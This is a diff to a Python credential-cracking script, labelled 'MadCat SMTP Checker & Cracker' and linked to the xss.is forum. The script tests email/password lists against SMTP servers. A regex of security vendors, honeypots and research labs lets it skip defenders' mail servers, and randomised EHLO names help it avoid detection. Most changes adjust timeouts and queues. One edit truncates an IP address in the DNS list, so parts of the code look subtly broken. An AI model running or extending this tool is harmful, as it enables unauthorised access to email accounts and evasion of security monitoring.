@@ -27,8 +27,8 @@ thread_counter_lock = threading.Lock()
 # mail providers where SMTP access is disabled by default
 bad_mail_servers = 'bk.ru,qq.com'
 
-# fixed dns list - removed double comma
-custom_dns_nameservers = '1.1.1.2,1.0.0.2,208.67.222.222,208.67.220.220,1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9,149.112.112.112,185.228.168.9,185.228.169.9,76.76.19.19,76.223.122.150,94.140.14.14,94.140.15.15,84.200.69.80,84.200.70.40,8.26.56.26,8.20.247.20,205.171.3.65,205.171.2.65,195.46.39.39,195.46.39.40,159.89.120.99,134.195.4.2,216.146.35.35,216.146.36.36,45.33.97.5,37.235.1.177,77.88.8.8,77.88.8.1,91.239.100.100,89.233.43.71,80.80.80.80,80.80.81.81,74.82.42.42,64.6.64.6,64.6.65.6,45.77.165.194,45.32.36.36'.split(',')
+# fixed dns list
+custom_dns_nameservers = '1.1.1.2,1.0.0.2,208.67.222.222,208.67.220.220,1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9,149.112.112.112,185.228.168.9,185.228.169.9,76.76.19.19,76.223.122.150,94.140.14.14,94.140.15.15,84.200.69.80,84.200.70.40,8.26.56.26,8.20.247.20,205.171.3.65,205.171.2.65,195.46.39.39,195.46.39.40,159.89.120.99,134.195.4.2,216.146.35.35,216.146.36.36,45.33.97.5,37.235.1.177,77.88.8.8,77.88.8.1,91.239.100.100,89.233.43.71,80.80.80.80,80.80.81.81,74.82.42.42,64.6.64.6,64.6.65.6,45.77.165.194,45.32.36'.split(',')
 
 # more dns servers url
 dns_list_url = 'https://public-dns.info/nameservers.txt'
@@ -36,7 +36,7 @@ dns_list_url = 'https://public-dns.info/nameservers.txt'
 # expanded lists of SMTP endpoints
 autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_enriched.txt'
 
-# dangerous mx domains - FIXED: escaped dots properly
+# dangerous mx domains
 dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
 
 # FIXED: Added missing initialization
@@ -52,7 +52,7 @@ wrn = b+'[\033[33m!\033[37m] '+z
 inf = b+'[\033[34mi\033[37m] '+z
 npt = b+'[\033[37m?\033[37m] '+z
 
-# EHLO base names (random generated per use)
+# EHLO base names
 EHLO_NAMES_BASE = [
     'mail-{rand}.local',
     'client-{uuid}.example.com',
@@ -67,9 +67,11 @@ def generate_ehlo_name():
         return name.replace('{uuid}', uuid.uuid4().hex[:8])
     return name
 
+# FIXED: DNS with timeout
 @lru_cache(maxsize=4096)
 def cached_dns_resolve(host, record_type):
     global resolver_obj
+    resolver_obj.lifetime = 5  # 5 seconds timeout for DNS
     return resolver_obj.resolve(host, record_type)
 
 def show_banner():
@@ -82,7 +84,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v55.12.15{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v44.12.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -203,7 +205,7 @@ def get_rand_ip_of_host(host, attempt=0):
             host = cached_dns_resolve(host, 'cname')[0].target
         except:
             pass
-        # Исправлено: правильная логика выбора IPv6/IPv4
+        # FIXED: правильная логика IPv6
         use_ipv6 = bool(socket.has_ipv6 and socket.has_ipv6 != '-' and socket.has_ipv6 != False)
         try:
             ip_array = cached_dns_resolve(host, 'aaaa' if use_ipv6 else 'a')
@@ -227,7 +229,6 @@ def guess_smtp_server(domain):
         mx_records = list(resolver_obj.resolve(domain, 'mx'))
         for mx in mx_records:
             mx_candidate = str(mx.exchange).rstrip('.')
-            # FIXED: Check if dangerous_regex is not None
             is_dangerous = (dangerous_regex is not None and dangerous_regex.search(mx_candidate))
             is_outlook = re.search(r'\.outlook\.com$', mx_candidate)
             if not (is_dangerous and not is_outlook):
@@ -251,11 +252,11 @@ def guess_smtp_server(domain):
             continue
         for port in [2525, 587, 465, 25]:
             debug(f'trying {host}, {ip}:{port}')
-            # Быстрая проверка без is_listening
+            # Быстрая проверка подключения
             try:
                 socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
                 s = socket.socket(socket_type, socket.SOCK_STREAM)
-                s.settimeout(2)
+                s.settimeout(3)
                 if port == 465:
                     context = ssl._create_unverified_context()
                     s = context.wrap_socket(s, server_hostname=ip)
@@ -323,6 +324,8 @@ def socket_send_and_read(sock, cmd=''):
     if cmd:
         debug('>>> '+cmd)
         sock.send((cmd.strip()+'\r\n').encode('ascii'))
+    # FIXED: добавлен таймаут на чтение
+    sock.settimeout(10)
     scream = sock.recv(2**10).decode('ascii', errors='ignore').strip()
     debug('<<< '+scream)
     return scream
@@ -332,7 +335,7 @@ def socket_get_free_smtp_server(smtp_server, port):
     smtp_server_ip = get_rand_ip_of_host(smtp_server)
     socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
     s = socket.socket(socket_type, socket.SOCK_STREAM)
-    s.settimeout(5)
+    s.settimeout(10)  # FIXED: таймаут 10 секунд
     try:
         if port == 465:
             context = ssl._create_unverified_context()
@@ -403,22 +406,24 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
         print(f"[ERROR] SMTP timeout: {e}")
         return False
 
+# FIXED: worker_item с таймаутами и правильной обработкой
 def worker_item(jobs_que, results_que):
     global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
     try:
         while True:
             if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
                 break
-            if jobs_que.empty():
+            
+            # FIXED: неблокирующая проверка очереди с таймаутом
+            try:
+                smtp_server, port, smtp_user, password = jobs_que.get(timeout=2)
+            except queue.Empty:
                 if no_jobs_left:
                     break
-                else:
-                    results_que.put('queue exhausted, '+bold('sleeping...'))
-                    time.sleep(1)
-                    continue
+                time.sleep(0.5)
+                continue
             
             time_start = time.perf_counter()
-            smtp_server, port, smtp_user, password = jobs_que.get()
             login_template = default_login_template
             
             try:
@@ -569,7 +574,8 @@ try:
 except Exception as e:
     exit(err+red(e))
 
-jobs_que = queue.Queue(maxsize=5000)  # Увеличен размер очереди
+# FIXED: убран maxsize или сделан очень большим
+jobs_que = queue.Queue(maxsize=0)  # 0 = бесконечный размер
 results_que = queue.Queue()
 ignored = 0
 goods = 0
@@ -609,7 +615,8 @@ with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
     for i in range(start_from_line):
         fp.readline()
     while True:
-        while not no_jobs_left and jobs_que.qsize() < min_threads*2:
+        # FIXED: проверка jobs_que.qsize() с небольшим запасом
+        while not no_jobs_left and jobs_que.qsize() < min_threads * 2:
             line = fp.readline()
             if not line:
                 no_jobs_left = True
@@ -627,7 +634,8 @@ with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
                     with progress_lock:
                         progress += 1
         
-        if threads_counter == 0 and no_jobs_left and not jobs_que.qsize():
+        # FIXED: добавлено условие выхода если нет работающих потоков и очередь пустая
+        if threads_counter == 0 and no_jobs_left and jobs_que.empty():
             break
         
         time.sleep(0.04)
